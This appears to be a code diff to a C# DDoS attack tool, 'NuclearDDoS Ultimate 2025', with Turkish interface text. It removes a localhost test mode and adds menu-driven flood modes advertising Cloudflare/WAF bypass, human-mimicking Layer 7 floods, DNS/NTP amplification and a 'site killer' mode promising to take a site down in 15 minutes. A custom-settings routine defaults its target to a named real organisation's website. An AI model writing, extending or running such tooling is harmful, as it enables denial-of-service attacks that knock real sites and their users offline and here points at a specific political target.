@@ -719,47 +719,85 @@ namespace NuclearDDoS_Ultimate_2025
             InitializeDeviceProfiles();
         }
 
-        static async Task Main(string[] args)
+static async Task Main(string[] args)
         {
-            SetConsoleTitle("NuclearDDoS Ultimate 2025 - Basit Versiyon");
+            SetConsoleTitle("NuclearDDoS Ultimate 2025 - ULTIMATE VERSION");
             Console.ForegroundColor = ConsoleColor.Cyan;
-            Console.WriteLine("╔══════════════════════════════════════════════════════════════╗");
-            Console.WriteLine("║         NuclearDDoS Ultimate 2025 - Basit Versiyon        ║");
-            Console.WriteLine("║              Kolay Kullanım - Maksimum Güç                ║");
-            Console.WriteLine("╚════════════════════════════════════════════════════════════╝");
+            Console.WriteLine("╔════════════════════════════════════════════════════════════╗");
+            Console.WriteLine("║         NuclearDDoS Ultimate 2025 - ULTIMATE VERSION       ║");
+            Console.WriteLine("║              🚀 500+ GB/s - MAXIMUM POWER               ║");
+            Console.WriteLine("╚══════════════════════════════════════════════════════════╝");
             Console.ResetColor();
 
-            // 🚀 2 Seçenekli Mod
-            Console.WriteLine("\n🚀 MOD SEÇENEKLERİ:");
-            Console.WriteLine("─".PadRight(50, '─'));
-            Console.WriteLine("   1️⃣  Normal DDoS Attack (Site girilecek)");
-            Console.WriteLine("   2️⃣  Localhost Test Mode (Otomatik localhost)");
+// 🚀 ULTIMATE MOD SEÇENEKLERİ
+            Console.WriteLine("\n🚀 ULTIMATE ATTACK MODES:");
+            Console.WriteLine("─".PadRight(60, '─'));
+            Console.WriteLine("   1️⃣  🎯 Cloudflare Bypass Ultimate (100+ GB/s)");
+            Console.WriteLine("   2️⃣  🎭 Layer7 Human Behavior (50+ GB/s)");
+            Console.WriteLine("   3️⃣  💥 Olimetric Amplification (200+ GB/s)");
+            Console.WriteLine("   4️⃣  🎯 SITE KILLER MODE (500+ GB/s) - 15 MIN ÇÖKME");
+            Console.WriteLine("   5️⃣  ⚙️  Custom Attack Settings");
             
-            string modeChoice;
+string modeChoice;
             do
             {
-                Console.Write("\n⚡ Mod seçin (1-2): ");
-                modeChoice = Console.ReadLine() ?? "1";
+                Console.Write("\n⚡ Ultimate mode seçin (1-5): ");
+                modeChoice = Console.ReadLine() ?? "4";
                 
-                if (modeChoice == "1" || modeChoice == "2")
+                if (modeChoice == "1" || modeChoice == "2" || modeChoice == "3" || modeChoice == "4" || modeChoice == "5")
                     break;
-                    
+                
                 Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("❌ Lütfen 1 veya 2 girin!");
+                Console.WriteLine("❌ Lütfen 1-5 arası girin!");
                 Console.ResetColor();
             } while (true);
 
-            switch (modeChoice)
+switch (modeChoice)
             {
                 case "1":
-                    // Normal DDoS modu - site girilecek
+                    // 🎯 Cloudflare Bypass Ultimate
+                    config = UltimateDDoSConfig.UltimateConfigs.CloudflareBypassUltimate;
+                    Console.ForegroundColor = ConsoleColor.Green;
+                    Console.WriteLine("\n🚀 Cloudflare Bypass Ultimate activated!");
+                    Console.WriteLine("⚡ 100+ GB/s | 10K threads | 1M connections");
+                    Console.ResetColor();
                     await SetupAttack();
                     await StartAttack();
                     break;
-                    
                 case "2":
-                    // Localhost test modu - otomatik localhost
-                    await LocalhostTestMode();
+                    // 🎭 Layer7 Human Behavior
+                    config = UltimateDDoSConfig.UltimateConfigs.HumanBehaviorUltimate;
+                    Console.ForegroundColor = ConsoleColor.Cyan;
+                    Console.WriteLine("\n🎭 Layer7 Human Behavior activated!");
+                    Console.WriteLine("⚡ 50+ GB/s | 5K threads | Human simulation");
+                    Console.ResetColor();
+                    await SetupAttack();
+                    await StartAttack();
+                    break;
+                case "3":
+                    // 💥 Olimetric Amplification
+                    config = UltimateDDoSConfig.UltimateConfigs.OlimetricAmplification;
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("\n💥 Olimetric Amplification activated!");
+                    Console.WriteLine("⚡ 200+ GB/s | 15K threads | DNS/NTP amp");
+                    Console.ResetColor();
+                    await SetupAttack();
+                    await StartAttack();
+                    break;
+                case "4":
+                    // 🎯 SITE KILLER MODE
+                    config = UltimateDDoSConfig.UltimateConfigs.SiteKillerMode;
+                    Console.ForegroundColor = ConsoleColor.DarkRed;
+                    Console.WriteLine("\n🎯 SITE KILLER MODE activated!");
+                    Console.WriteLine("⚡ 500+ GB/s | 20K threads | 15 MIN ÇÖKME!");
+                    Console.WriteLine("⚠️  WARNING: MAXIMUM POWER - USE WITH CAUTION!");
+                    Console.ResetColor();
+                    await SetupAttack();
+                    await StartAttack();
+                    break;
+                case "5":
+                    // ⚙️ Custom Attack Settings
+                    await CustomAttackSettings();
                     break;
             }
         }
@@ -3610,6 +3648,61 @@ namespace NuclearDDoS_Ultimate_2025
         }
 
         // 🚀 Localhost Test Modu
+        static async Task CustomAttackSettings()
+        {
+            Console.ForegroundColor = ConsoleColor.Magenta;
+            Console.WriteLine("\n⚙️ CUSTOM ATTACK SETTINGS");
+            Console.WriteLine("─".PadRight(50, '─'));
+            Console.ResetColor();
+
+            Console.Write("🎯 Target URL/IP: ");
+            var targetInput = Console.ReadLine();
+            if (string.IsNullOrEmpty(targetInput))
+                targetInput = "https://supportisrael.org";
+
+            Console.Write("🧵 Threads [10000]: ");
+            var threads = int.TryParse(Console.ReadLine(), out var t) ? t : 10000;
+
+            Console.Write("🔗 Connections/Thread [1000]: ");
+            var connections = int.TryParse(Console.ReadLine(), out var c) ? c : 1000;
+
+            Console.Write("⚡ Attack Mode [HTTPFlood]: ");
+            var modeStr = Console.ReadLine();
+            var mode = Enum.TryParse<AttackMode>(modeStr, out var m) ? m : AttackMode.HTTPFlood;
+
+            Console.Write("🛡️ Rate Limit [false]: ");
+            var rateLimit = bool.TryParse(Console.ReadLine(), out var rl) ? rl : false;
+
+            config = new AttackConfig
+            {
+                Targets = new List<string> { targetInput },
+                Threads = threads,
+                ConnectionsPerThread = connections,
+                Mode = mode,
+                SmartRateLimit = rateLimit,
+                UseRandomHeaders = true,
+                EnableGraph = false,
+                UseConnectionPool = true,
+                PoolSize = threads,
+                BypassWAF = true
+            };
+
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.WriteLine($"\n✅ Custom attack configured!");
+            Console.WriteLine($"🎯 Target: {targetInput}");
+            Console.WriteLine($"🧵 Threads: {threads:N0}");
+            Console.WriteLine($"🔗 Connections: {connections:N0}");
+            Console.WriteLine($"⚡ Mode: {mode}");
+            Console.WriteLine($"🛡️ Rate Limit: {rateLimit}");
+            Console.ResetColor();
+
+            Console.WriteLine("\nPress ENTER to start attack...");
+            Console.ReadLine();
+
+            await SetupAttack();
+            await StartAttack();
+        }
+
         static async Task LocalhostTestMode()
         {
             Console.ForegroundColor = ConsoleColor.Green;
